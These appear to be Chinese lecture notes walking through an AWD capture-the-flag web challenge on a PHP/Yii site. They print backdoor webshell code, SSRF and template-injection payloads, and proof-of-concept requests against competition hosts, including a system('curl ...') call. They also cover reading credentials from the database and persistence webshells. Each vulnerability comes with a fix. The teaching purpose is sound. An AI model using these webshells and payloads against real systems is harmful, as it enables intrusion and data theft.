时间准时7点半开始
大家对于讲解中最想知道的是哪些东西，可以在聊天窗口说一下

网络文化节


大家对于这个题目已知什么漏洞

比赛过程中遇见什么事情很无奈

不会写批量提交脚本


漏洞都发现不来0.0拿到题目一脸懵逼
    AWD题型
    攻击者，要拿到其他团队守护的机器的shell权限
    防守方，要保护自己的服务器


    备份
        站点源码
        数据库

        本地-> /home -> .

    更改弱口令
        ssh
        mysql
        WEB引用业务系统的口令

    上通防、文件监控、进程监控

    分工合作






怎样知道对方靶机ip 试还是主办方给出
    我  10.0.1.1
        10.0.2.1
        10.0.3.1
    nmap



常用的工具有哪些？
    PWN
    WEB PHP   burpsuite seay d盾 firefox
    JAVA




D盾扫描后门

《企业级代码审计》 法师   



eval aasert

路由


如果需要下载源码可以使用WinSCP MobaXterm

# 1. 网页后门 `backend/views/site/fun.php`

## 解题步骤
利用D盾扫描站点后门，发现该文件是网页后门
分析以下代码
```php

echo "404 not found!!!!!!!!!!!!!!";
if ($_GET['a'] = 'flag') {
    if ($_POST['b']=='sec') {
        @eval($_POST['cmd']);
    }
}

最后构建poc
http://101.71.29.6:10015/backend/views/site/fun.php?a=flag
b=sec&cmd=system('curl http://10.0.1.2?token=WNHOMGGL');
```

## 防护方法
只要是后门或者webshell的话，都是恶意代码
只要删除就好了


# 2. 网页后门 `frontend/views/html5/index.php`

## 解题步骤

`http://101.71.29.6:10015/frontend/web/html5/?data=ls`

通过D盾发现网页后门，分析得到利用`data`参数可以任意执行系统命令
```php
17-18
$dt = create_function('$a','echo `$a`;');
@$dt($_GET['data']);
```
最后得到poc为`http://101.71.29.6:10015/frontend/web/html5/?data=ls -alt`

## 防护方法

只要是后门或者webshell的话，都是恶意代码
只要删除就好了
如果是植入到项目文件中的，那么删除关键代码即可


防护是把那两行代码删掉就可以么？
    对，删除即可

[PAYLOAD POC EXP术语理解](http://www.fooying.com/the-art-of-xss-1-introduction/)


如果使用mvc框架去实现的站点，业务逻辑代码主要在控制器中



seay工具主要是帮我们找到可疑的PHP代码，我们还是要分析

代码审计注意：
    审计应具有目的性
    找到有输入和输出的地方
    先找业务逻辑相关的代码
    先粗看在细看
    结合页面功能去分析代码


# 3. 后台SSRF

## 解题步骤
我们通过seay得到`/backend/controllers/SiteController.php`具有SSRF漏洞
```php
public function actionIndex()
{
    $user=DisUser::find()->select('id')->asArray()->all();
    $wokers=DisWorksInfo::find()->select('id')->asArray()->all();
    $admin_num=Log::find()->select('id')->asArray()->all();
    if(Yii::$app->request->get('url')) {
        $res = @file_get_contents(Yii::$app->request->get('url'));
        \Yii::$app->getSession()->setFlash('success',$res);
    }
        $weather = json_decode(
            @file_get_contents('https://api.thinkpage.cn/v3/weather/now.json?key=rj5wncj9qq5bihmy&location=xuzhou&language=zh-Hans&unit=c'),
            true
        );
    //\Yii::$app->getSession()->setFlash('error','fatal error');
    return $this->render('index',
        [
            'usernum'=>count($user),
            'worknum'=>count($wokers),
            'adminnum'=>count($admin_num),
            'weather'=>$weather['results'][0]
        ]);
}
```
但是发现他是后台文件，所以我们必须先登录到后门

但是我们没有后台的账号密码：
1. 暴力破解(可以获得口令`admin/123`)
2. 先去数据库查询表中信息(密码经过了加密，无法直接获得)

如果要进数据库，我们还需要数据库的帐号和密码
先找命名为`conf config db`文件夹，里面一般会存有数据库或站点的配置文件
需要我们人工去识别里面的内容

最后在`/common/main-local.php`中发现口令为`root/空`

```php
mysql -uroot -p   
密码为空直接回车

use display;
show tables;
SELECT * FROM admin;
exit
```

什么是SSRF漏洞?

Server-side requests forgery
服务器请求伪造攻击

WEB应用提供了从其他服务器获取数据的功能，但没有对远程服务器地址和远程服务器返回的信息进行合理的过滤，导致攻击者可以利用该漏洞对外网无法访问的服务器进行攻击

获得内网开放服务器地址 端口 banner信息
redis 

一般SSRF漏洞会出现在哪里呢，比如说传头像，我们直接用外网的路径当作头像

我们最后构建poc获得curl

`http://101.71.29.6:10015/backend/web/?url=http://10.0.1.2?token=WNHOMGGL`


## 防护方法

直接删除`/backend/controllers/SiteController.php`上`69-72`行的代码即可
```php
if(Yii::$app->request->get('url')) {
    $res = @file_get_contents(Yii::$app->request->get('url'));
    \Yii::$app->getSession()->setFlash('success',$res);
}
```



# 4. 前台任意用户登录(越权)+ 模版渲染漏洞

## 解题步骤是
[参考文章](https://www.anquanke.com/post/id/152764)


upload -> print -> parseIf -> parseSubif 
提交报名页面到数据库中
把报名数据拿出来显示在页面中
parseIF、parseSubif就是去处理数据的结构


找到输入点，让输入点到eval里面去执行


获取前台口令思路
1. 暴力破解(没有弱口令)
2. MYSQL去查(密码经过加密，无法查看)
3. 利用注册功能去注册(前台是没有注册功能的)
4. 利用后台区创建用户(后台注册的账户无法正常登陆)

但是最后都不行，最后是使用了`http://101.71.29.6:10015/frontend/web/user/login_test`
开发人员留下的登录接口进行前台登录的

在然后就是利用模版渲染漏洞去执行系统代码
```
{if:1)echo `ls`;die();//}{end if}
{if:1)$GLOBALS['_GE'.'T'][a]($GLOBALS['_GE'.'T'][b]);die();//}{end if}
```


在比赛中一般会放提示的，可能是放流量可能是给出漏洞所在页面或者漏洞的关键代码



## 防护方法
删除在`frontend/controllers/UserController.php 135-143`中`login_test`的方法
在`parseIf`上加上足够的过来，比如过来``echo ` $GLOBALS ``





怎么写批量化的利用脚本

python
写的快，代码量少




如何备份数据库:方法1  通过mysql命令去备份
1. 找到站点中的配置文件获得mysql的密码
2. 执行mysql备份数据库的命令

sh脚本

在事前写好备份数据库的php脚本

该脚本功能一键自动备份 一键自动还原



权限维持  上不死马 内存马



